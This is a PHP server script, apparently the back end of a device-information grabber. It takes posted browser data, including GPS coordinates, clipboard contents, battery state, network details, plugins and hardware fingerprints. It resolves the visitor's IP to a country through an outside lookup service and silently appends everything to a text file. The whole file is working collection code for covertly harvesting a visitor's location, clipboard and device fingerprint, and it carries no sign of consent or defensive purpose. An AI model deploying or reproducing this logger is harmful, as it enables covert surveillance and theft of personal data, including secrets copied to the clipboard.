<?php
error_reporting(0);

// Retrieve the posted data
$networkinfo = $_POST['networkinformation'] ?? 'N/A';
$batterypercentage = $_POST['batterypercentage'] ?? 'N/A';
$ischarging = $_POST['ischarging'] ?? 'N/A';
$width = $_POST['width'] ?? 'N/A';
$height = $_POST['height'] ?? 'N/A';
$platform = $_POST['platform'] ?? 'N/A';
$gps = $_POST['gps'] ?? 'N/A';
$localtime = $_POST['localtime'] ?? 'N/A';
$devicelang = $_POST['devicelang'] ?? 'N/A';
$iscookieEnabled = $_POST['iscookieEnabled'] ?? 'N/A';
$useragent = $_POST['useragent'] ?? 'N/A';
$deviceram = $_POST['deviceram'] ?? 'N/A';
$cpuThreads = $_POST['cpuThreads'] ?? 'N/A';
$referurl = $_POST['referurl'] ?? 'N/A';
$clipboard = $_POST['clipboard'] ?? 'N/A';
$timezoneOffset = $_POST['timezoneOffset'] ?? 'N/A';
$osVersion = $_POST['osVersion'] ?? 'N/A';
$browserName = $_POST['browserName'] ?? 'N/A';
$browserVersion = $_POST['browserVersion'] ?? 'N/A';
$plugins = $_POST['plugins'] ?? 'N/A';
$doNotTrack = $_POST['doNotTrack'] ?? 'N/A';
$touchSupport = $_POST['touchSupport'] ?? 'N/A';
$colorDepth = $_POST['colorDepth'] ?? 'N/A';
$availScreenWidth = $_POST['availScreenWidth'] ?? 'N/A';
$availScreenHeight = $_POST['availScreenHeight'] ?? 'N/A';
$onlineStatus = $_POST['onlineStatus'] ?? 'N/A';
$pixelRatio = $_POST['pixelRatio'] ?? 'N/A';

// Get IP address and country information
$ip = $_SERVER['REMOTE_ADDR'];
$details = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
$ulke = $details->country ?? 'Unknown';

// Set timezone and get current date and time
date_default_timezone_set('Asia/Karachi');
$tarih = date("d-m-Y H:i:s");

// Open file for appending and write data
$file = fopen('info.txt', 'a');
fwrite($file, "Ip Address: " .$ip."\n\n".
"Country: ".$ulke ."\n\n".
"NetworkInformation: ".$networkinfo."\n\n".
"BatteryPercentage: ".$batterypercentage."\n\n".
"IsCharging: ".$ischarging."\n\n".
"ScreenWidth: ".$width."\n\n".
"ScreenHeight: ".$height."\n\n".
"Platform: ".$platform."\n\n".
"GPS: ".$gps."\n\n".
"DeviceLocalTime: ".$localtime."\n\n".
"DeviceLanguage: ".$devicelang."\n\n".
"CookieEnabled: ".$iscookieEnabled."\n\n".
"UserAgent: ".$useragent."\n\n".
"DeviceMemory: ".$deviceram."\n\n".
"CpuThreads: ".$cpuThreads."\n\n".
"Clipboard: ".$clipboard."\n\n".
"ReferUrl: ".$referurl."\n\n".
"TimezoneOffset: ".$timezoneOffset."\n\n".
"OS Version: ".$osVersion."\n\n".
"Browser Name: ".$browserName."\n\n".
"Browser Version: ".$browserVersion."\n\n".
"Installed Plugins: ".$plugins."\n\n".
"Do Not Track: ".$doNotTrack."\n\n".
"Touch Support: ".$touchSupport."\n\n".
"Color Depth: ".$colorDepth."\n\n".
"Available Screen Width: ".$availScreenWidth."\n\n".
"Available Screen Height: ".$availScreenHeight."\n\n".
"Online Status: ".$onlineStatus."\n\n".
"Device Pixel Ratio: ".$pixelRatio."\n\n".
"Timestamp: ".$tarih."\n\n\n\n");
fclose($file);
?>
